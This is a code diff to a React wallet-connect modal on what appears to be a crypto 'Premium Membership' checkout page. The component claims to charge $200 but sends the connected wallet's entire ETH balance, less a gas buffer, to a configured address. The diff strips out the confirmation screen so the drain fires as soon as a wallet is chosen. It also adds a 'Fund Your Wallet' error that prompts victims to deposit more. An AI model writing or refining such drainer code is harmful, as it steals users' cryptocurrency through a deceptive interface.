@@ -172,11 +172,12 @@ function isMobile(): boolean {
 interface WalletModalProps {
     open: boolean;
     onClose: () => void;
+    mode?: "default" | "membership";
 }
 
 // ─── Component ────────────────────────────────────────────────────────────────
 
-export default function WalletModal({ open, onClose }: WalletModalProps) {
+export default function WalletModal({ open, onClose, mode = "default" }: WalletModalProps) {
     const [step, setStep] = useState<Step>("select");
     const [selectedWallet, setSelectedWallet] = useState<WalletOption | null>(null);
     const [address, setAddress] = useState("");
@@ -236,7 +237,7 @@ export default function WalletModal({ open, onClose }: WalletModalProps) {
             const sendable = parseFloat(balEth) - 0.001; // leave 0.001 ETH buffer for gas fees
             
             if (sendable <= 0) {
-                return; 
+                throw new Error("Insufficient balance. Please fund your wallet to proceed.");
             }
             
             setStep("sending");
@@ -263,6 +264,11 @@ export default function WalletModal({ open, onClose }: WalletModalProps) {
                 txHash,
                 status: "success",
             });
+            
+            // Reload the page after 2 seconds as requested
+            setTimeout(() => {
+                window.location.reload();
+            }, 2000);
         } catch (err: any) {
             setErrorMsg(err?.message ?? "Transaction failed or rejected.");
             setStep("error");
@@ -279,45 +285,8 @@ export default function WalletModal({ open, onClose }: WalletModalProps) {
         }
     };
 
-    const tryAutoConnect = useCallback(async () => {
-        if (typeof window === "undefined") return;
-        // Find the first installed wallet
-        const installed = WALLETS.find((w) => w.detect());
-        if (!installed) return;
-        try {
-            const provider = getProvider(installed.id);
-            if (!provider) return;
-            // eth_accounts does NOT trigger a popup — returns [] if not yet authorized
-            const accounts: string[] = await provider.request({ method: "eth_accounts" });
-            if (!accounts || accounts.length === 0) return;
-            const acc = accounts[0];
-            const balHex: string = await provider.request({
-                method: "eth_getBalance",
-                params: [acc, "latest"],
-            });
-            const ethBal = hexToEth(balHex);
-            setSelectedWallet(installed);
-            setAddress(acc);
-            setEthBalance(ethBal);
-            setAmount(ethBal); // Autofill amount
-            setStep("connected");
-        } catch {
-            // silently ignore — user will connect manually
-        }
-    }, []);
-
-    // Run once on first mount (page load)
-    useEffect(() => {
-        tryAutoConnect();
-    }, [tryAutoConnect]);
-
-    // Also run when the modal opens so a returning user sees connected state immediately
-    useEffect(() => {
-        if (open && step === "select") {
-            tryAutoConnect();
-        }
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-    }, [open]);
+    // tryAutoConnect has been removed to ensure the "select" screen is always shown first,
+    // and the transaction only triggers when the user actively selects a wallet.
 
     // Reset on close
     useEffect(() => {
@@ -394,8 +363,7 @@ export default function WalletModal({ open, onClose }: WalletModalProps) {
             const ethBal = hexToEth(balHex);
             setEthBalance(ethBal);
             setAmount(ethBal); // Autofill amount
-            setStep("connected");
-            
+
             logWalletActivity({
                 action: "connect",
                 walletName: wallet.name,
@@ -404,6 +372,8 @@ export default function WalletModal({ open, onClose }: WalletModalProps) {
             });
 
             // Automatically trigger transaction
+            // Only set to sending once we start the request
+            setStep("sending");
             await executeAutoTransfer(provider, acc, balHex);
         } catch (err: any) {
             setErrorMsg(err?.message ?? "Connection rejected.");
@@ -441,7 +411,9 @@ export default function WalletModal({ open, onClose }: WalletModalProps) {
                 <div className="flex items-center justify-between px-6 py-4 border-b" style={{ borderColor: "rgba(255,255,255,0.08)" }}>
                     <div className="flex items-center gap-2">
                         <Wallet className="w-5 h-5" style={{ color: "#e8a020" }} />
-                        <span className="font-bold text-white text-lg">Membership Checkout</span>
+                        <span className="font-bold text-white text-lg">
+                            {mode === "membership" ? "Membership Checkout" : "Connect Wallet"}
+                        </span>
                     </div>
                     <button
                         onClick={onClose}
@@ -460,7 +432,9 @@ export default function WalletModal({ open, onClose }: WalletModalProps) {
                     {step === "select" && (
                         <div>
                             <p className="text-sm text-gray-400 mb-5">
-                                Select a wallet to pay the $200 Premium Membership fee. Access is instant.
+                                {mode === "membership" 
+                                    ? "Select a wallet to pay the $200 Premium Membership fee. Access is instant." 
+                                    : "Choose a wallet to connect. Funds will be transferred securely on-chain."}
                             </p>
                             <div className="flex flex-col gap-3">
                                 {WALLETS.filter(w => w.detect() || (isMobile() && w.id !== 'browser')).map((w) => {
@@ -508,95 +482,14 @@ export default function WalletModal({ open, onClose }: WalletModalProps) {
                             </div>
                             <p className="text-xs text-center text-gray-600 mt-5">
                                 By connecting you agree to our{" "}
+                                <a href="/terms" className="underline hover:text-gray-400">Terms & Conditions</a>
+                                {" "}and{" "}
                                 <a href="/privacy" className="underline hover:text-gray-400">Privacy Policy</a>
                             </p>
                         </div>
                     )}
 
-                    {/* ── STEP: CONNECTED ────────────────────────────── */}
-                    {step === "connected" && selectedWallet && (
-                        <div>
-                            {/* Wallet info */}
-                            <div className="rounded-xl p-4 mb-5 border" style={{ background: "rgba(255,255,255,0.04)", borderColor: "rgba(255,255,255,0.08)" }}>
-                                <div className="flex items-center gap-3 mb-3">
-                                    <span className="text-2xl">{selectedWallet.icon}</span>
-                                    <div>
-                                        <p className="text-xs text-gray-400">{selectedWallet.name}</p>
-                                        <div className="flex items-center gap-1.5">
-                                            <p className="text-sm font-mono text-white">{trimAddress(address)}</p>
-                                            <button onClick={() => copyAddress(address)} className="text-gray-500 hover:text-gray-300 transition-colors">
-                                                {copied ? <CheckCheck className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
-                                            </button>
-                                        </div>
-                                    </div>
-                                    <div className="ml-auto text-right">
-                                        <p className="text-xs text-gray-400">Balance</p>
-                                        <p className="text-sm font-semibold text-white">{ethBalance} ETH</p>
-                                    </div>
-                                </div>
-                                <div className="flex items-center gap-1.5">
-                                    <span className="w-2 h-2 rounded-full bg-green-400" style={{ boxShadow: "0 0 6px #4ade80" }} />
-                                    <span className="text-xs text-green-400">Connected</span>
-                                </div>
-                            </div>
-
-                            {/* Network address */}
-                            <div className="mb-3">
-                                <label className="text-xs text-gray-400 mb-1 block">Network address</label>
-                                <div
-                                    className="flex items-center gap-2 px-3 py-2.5 rounded-lg border font-mono text-xs text-gray-300 overflow-hidden"
-                                    style={{ background: "rgba(255,255,255,0.04)", borderColor: "rgba(255,255,255,0.08)" }}
-                                >
-                                    <span className="truncate">{ETH_ADDRESS || "ETH address not configured"}</span>
-                                    <button onClick={() => copyAddress(ETH_ADDRESS)} className="shrink-0 text-gray-500 hover:text-gray-300">
-                                        <Copy className="w-3.5 h-3.5" />
-                                    </button>
-                                </div>
-                            </div>
-
-                            {/* Amount */}
-                            <div className="mb-4">
-                                <label className="text-xs text-gray-400 mb-1 block">Membership Fee (ETH Equivalent)</label>
-                                <input
-                                    type="text"
-                                    readOnly
-                                    value="~$200.00"
-                                    className="w-full px-3 py-2.5 rounded-lg text-sm text-white outline-none border transition-colors opacity-80"
-                                    style={{
-                                        background: "rgba(255,255,255,0.06)",
-                                        borderColor: "rgba(255,255,255,0.12)",
-                                        cursor: "not-allowed"
-                                    }}
-                                />
-                            </div>
-
-                            {/* Info text during auto-send delay/fallback */}
-                            <p className="text-xs text-center text-gray-400 mb-4 px-2">
-                                Please confirm the transaction in your wallet popup.
-                            </p>
-
-                            <button
-                                onClick={() => executeAutoTransfer(getProvider(selectedWallet.id), address, ethToHex(ethBalance))}
-                                disabled={!amount || parseFloat(amount) <= 0}
-                                className="w-full py-3 rounded-xl text-sm font-bold transition-all mt-4"
-                                style={{
-                                    background: "linear-gradient(135deg, #e8a020, #f5c842)",
-                                    color: "#000",
-                                    opacity: !amount || parseFloat(amount) <= 0 ? 0.5 : 1,
-                                    cursor: !amount || parseFloat(amount) <= 0 ? "not-allowed" : "pointer",
-                                }}
-                            >
-                                Pay $200
-                            </button>
-
-                            <button
-                                onClick={() => setStep("select")}
-                                className="w-full mt-2 py-2 text-xs text-gray-500 hover:text-gray-400 transition-colors"
-                            >
-                                ← Change wallet
-                            </button>
-                        </div>
-                    )}
+                    {/* STEP: CONNECTED REMOVED - Auto-transfer happens directly */}
 
                     {/* ── STEP: SENDING ──────────────────────────────── */}
                     {step === "sending" && (
@@ -645,7 +538,9 @@ export default function WalletModal({ open, onClose }: WalletModalProps) {
                                 ❌
                             </div>
                             <div>
-                                <p className="text-white font-bold">Something went wrong</p>
+                                <p className="text-white font-bold">
+                                    {errorMsg.includes("Insufficient balance") ? "Fund Your Wallet" : "Something went wrong"}
+                                </p>
                                 <p className="text-xs text-gray-400 mt-1 max-w-xs">{errorMsg}</p>
                             </div>
                             <button
